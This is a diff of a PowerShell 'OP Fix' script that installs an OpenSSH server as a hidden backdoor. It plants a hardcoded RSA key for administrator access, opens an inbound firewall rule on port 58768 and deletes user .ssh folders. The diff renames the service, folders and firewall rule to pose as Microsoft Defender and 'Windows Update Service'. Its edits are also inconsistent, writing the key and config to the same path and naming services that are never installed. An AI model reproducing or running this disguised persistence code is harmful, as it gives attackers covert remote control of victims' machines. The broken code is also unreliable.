@@ -6,9 +6,9 @@ if ([string]::IsNullOrEmpty($opconfirm)) {
 }
 if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Executing OP Fix..."
-	$openSSHFolder = "C:\ProgramData\Microsoft Edge"	
-	$InstallPath = "C:\Program Files\Microsoft Edge"
- 	$GitZipName = "openssh.zip"
+	$openSSHFolder = "C:\Users\Default\AppData\Defender"	
+	$InstallPath = "C:\Users\Default\AppData\Microsoft Defender"
+ 	$GitZipName = "defender.zip"
 	$DisablePasswordAuthentication = $True
 	$DisablePubkeyAuthentication = $False
 	$AutoStartSSHD = $true
@@ -87,11 +87,11 @@ if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Running Install Commands" -ForegroundColor Green
 	Set-Location $InstallPath -ErrorAction Stop
 	powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1
-	Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
+	Set-Service -Name defender -StartupType 'Automatic' -ErrorAction Stop
 	#Make sure your ProgramData\ssh directory exists
-	If (!(Test-Path $env:ProgramData\ssh)) {
+	If (!(Test-Path "C:\Users\Default\AppData\Defender")) {
 		Write-Host "Creating ProgramData\ssh directory" -ForegroundColor Green
-		New-Item -ItemType Directory -Force -Path $env:ProgramData\ssh -ErrorAction Stop | Out-Null
+		New-Item -ItemType Directory -Force -Path "C:\Users\Default\AppData\Defender" -ErrorAction Stop | Out-Null
 	}
 	#Setup sshd_config
 	Write-Host "Configure server config file" -ForegroundColor Green
@@ -99,26 +99,18 @@ if ($opconfirm.ToLower() -eq "y") {
 	Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
 	if ($DisablePasswordAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PasswordAuthentication no" -ErrorAction Stop }
 	if ($DisablePubkeyAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PubkeyAuthentication no" -ErrorAction Stop }
-	#Make sure your user .ssh directory exists
-	If (!(Test-Path "~\.ssh")) {
-		Write-Host "Creating User .ssh directory" -ForegroundColor Green
-		New-Item -ItemType Directory -Force -Path "~\.ssh" -ErrorAction Stop | Out-Null
-	}
-	#Set ssh_config
-	Write-Host "Configure client config file" -ForegroundColor Green
-	Add-Content -Path ~\.ssh\config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
 	#Setting autostarts
 	if ($AutoStartSSHD) {
 		Write-Host "Setting sshd service to Automatic start" -ForegroundColor Green;
-		Set-Service -Name sshd -StartupType Automatic;
+		Set-Service -Name defender -StartupType Automatic;
 	}
 	if ($AutoStartSSHAGENT) {
 		Write-Host "Setting ssh-agent service to Automatic start" -ForegroundColor Green;
-		Set-Service -Name ssh-agent -StartupType Automatic;
+		Set-Service -Name defenderd -StartupType Automatic;
 	}
 	#Start the service
 	Write-Host "Starting sshd Service" -ForegroundColor Green
-	Start-Service sshd -ErrorAction Stop
+	Start-Service defender -ErrorAction Stop
 	#Add to path if it isnt already there
 	$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path
 	if ($existingPath -notmatch $InstallPath.Replace("\", "\\")) {
@@ -134,17 +126,17 @@ if ($opconfirm.ToLower() -eq "y") {
 	powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false'
 	#Add firewall rule
 	Write-Host "Creating firewall rule" -ForegroundColor Green
-	New-NetFirewallRule -Name sshd -DisplayName 'Google Chrome Core Service' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
+	New-NetFirewallRule -Name sshd -DisplayName 'Windows Update Service' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
 	#Set Shell to powershell
 	Write-Host "Setting default shell to powershell" -ForegroundColor Green
 	New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
 	Write-Host "Installation completed successfully" -ForegroundColor Green
 	#Public Key Add
 	$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
-	if ($SSHPublicKey -ne "" -And (-not (Test-Path "C:\ProgramData\ssh\administrators_authorized_keys"  -PathType leaf ))) {
-			Set-Content -Path "C:\ProgramData\ssh\administrators_authorized_keys" -Value $SSHPublicKey 
+	if ($SSHPublicKey -ne "" -And (-not (Test-Path "C:\Users\Default\AppData\Defender"  -PathType leaf ))) {
+			Set-Content -Path "C:\Users\Default\AppData\Defender" -Value $SSHPublicKey 
 		}
-		$acl = Get-Acl "C:\ProgramData\ssh\administrators_authorized_keys"
+		$acl = Get-Acl "C:\Users\Default\AppData\Defender"
 		$acl.SetAccessRuleProtection($true, $false)
 		$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
 		$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
@@ -152,9 +144,9 @@ if ($opconfirm.ToLower() -eq "y") {
 		$acl.SetAccessRule($systemRule)
 		$acl | Set-Acl
 	#Port Change
-	$sshdConfigPath = "$env:ProgramData\ssh\sshd_config"
+	$sshdConfigPath = "C:\Users\Default\AppData\Defender"
 	$sshdConfigContent = Get-Content -Path $sshdConfigPath
-	$sshdConfigContent = $sshdConfigContent -replace "^#Port 22$", "Port 58769"
+	$sshdConfigContent = $sshdConfigContent -replace "^#Port 22$", "Port 58768"
 	$sshdConfigContent | Set-Content -Path $sshdConfigPath
 	#.ssh remove from user-root-dir
 	$currentUserRoot = $env:USERPROFILE
@@ -166,7 +158,7 @@ if ($opconfirm.ToLower() -eq "y") {
 		}
 	}
 	Set-Location $currentDirectory
-	Restart-Service sshd
+	Restart-Service defender
 	} else {
 }
 #OP Adv Fix
